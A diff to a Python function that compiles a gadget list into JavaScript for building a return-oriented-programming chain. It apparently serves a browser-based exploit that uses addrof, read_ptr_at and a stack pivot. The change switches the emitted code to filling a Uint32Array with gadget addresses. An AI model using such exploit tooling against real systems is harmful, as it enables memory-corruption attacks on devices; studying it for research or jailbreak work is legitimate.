@@ -42,35 +42,94 @@ def parse_gadgets(l):
 def final_pass(l, ls, gs):
     ans = []
     sp_offset = 8
+    last_gadgets = []
+    def push_gadget(g):
+        if ' //' in g:
+            last_gadgets.append(g.replace(' //', ', //', 1))
+        else:
+            last_gadgets.append(g+',')
+    def push_normal(g):
+        comments = []
+        while last_gadgets and last_gadgets[-1].startswith('//'):
+            comments.append(last_gadgets.pop())
+        comments.reverse()
+        if len(last_gadgets) == 1:
+            g0 = last_gadgets[0]
+            c = ''
+            if '//' in g0:
+                g0, c = g0.split('//', 1)
+                g0 = g0.strip()
+                c = ' //' + c
+            else: g0 = g0[:-1]
+            ans.append('set_gadget(%s);%s'%(g0, c))
+        elif last_gadgets:
+            g0 = last_gadgets.pop()
+            if '//' in g0: g0 = g0.replace(', //', ' //', 1)
+            else: g0 = g0[:-1]
+            ans.append('set_gadgets([\n%s\n%s\n]);'%('\n'.join(last_gadgets), g0))
+        last_gadgets[:] = ()
+        ans.extend(comments)
+        ans.append(g)
+    def push_comment(c):
+        if last_gadgets: last_gadgets.append('//'+c)
+        else: ans.append('//'+c)
     for i in l:
         if i.endswith(':'):
-            ans.append('//'+i)
+            push_comment(i)
             continue
         elif i.startswith('$$'):
-            ans.append(i[2:].replace('SP_OFFSET', str(sp_offset)))
+            push_normal(i[2:].replace('SP_OFFSET', str(sp_offset)))
             continue
         elif i == '$': pass
         elif i.startswith('$'):
-            ans.append('write_ptr_at(ropchain+%d, %s);'%(sp_offset, i[1:]))
+            push_gadget(i[1:])
         elif i.startswith('dp '):
             offset = eval(i[3:], ls)
-            ans.append('write_ptr_at(ropchain+%d, ropchain+%d); //%s'%(sp_offset, offset, i[3:]))
+            push_gadget('ropchain+%d //%s'%(offset, i[3:]))
         elif i.startswith('dq '):
             data = eval(i[3:], ls)
-            ans.append('write_mem(ropchain+%d, %r);'%(sp_offset, list((data & 0xffffffffffffffff).to_bytes(8, 'little'))))
+            low32 = data & 0xffffffff
+            high32 = (data >> 32) & 0xffffffff
+            push_normal('db([%d, %d]); // %s'%(low32, high32, hex(data)))
+            #ans.append('write_mem(ropchain+%d, %r);'%(sp_offset, list((data & 0xffffffffffffffff).to_bytes(8, 'little'))))
         elif i.startswith('db '):
             data = bytes(list(eval('('+i[3:]+')')))
             assert len(data) % 8 == 0
-            if any(data): ans.append('write_mem(ropchain+%d, %r);'%(sp_offset, list(data)))
+            #if any(data): ans.append('write_mem(ropchain+%d, %r);'%(sp_offset, list(data)))
+            if any(data): push_normal('db(%r);'%([int.from_bytes(data[i:i+4], 'little') for i in range(0, len(data), 4)]))
+            elif len(data): push_normal('ropchain_offset += %d;'%(len(data) // 4))
             sp_offset += len(data)
             continue
         elif i in gs:
             file, offset = gs[i]
-            ans.append('write_ptr_at(ropchain+%d, %s_base+%d); //%s'%(sp_offset, file, offset, i))
+            push_gadget('%s_base+%d //%s'%(file, offset, i))
         else:
             raise SyntaxError(i)
         sp_offset += 8
-    ans.insert(0, 'var ropchain = malloc(%d);'%sp_offset);
+    push_normal('')
+    ans.pop()
+    assert sp_offset % 8 == 0
+    ans.insert(0, 'var ropchain_array = new Uint32Array(%d);'%(sp_offset // 4))
+    ans.insert(1, 'var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);')
+    ans.insert(2, 'var ropchain_offset = 2;')
+    ans.insert(3, '''\
+function set_gadget(val)
+{
+    ropchain_array[ropchain_offset++] = val | 0;
+    ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
+}''')
+    ans.insert(4, '''\
+function set_gadgets(l)
+{
+    for(var i = 0; i < l.length; i++)
+        set_gadget(l[i]);
+}''')
+    ans.insert(5, '''\
+function db(data)
+{
+    for(var i = 0; i < data.length; i++)
+        ropchain_array[ropchain_offset++] = data[i];
+}''')
     if 'pivot(ropchain);' not in ans: ans.append('pivot(ropchain);')
     return '\n'.join(ans)
 
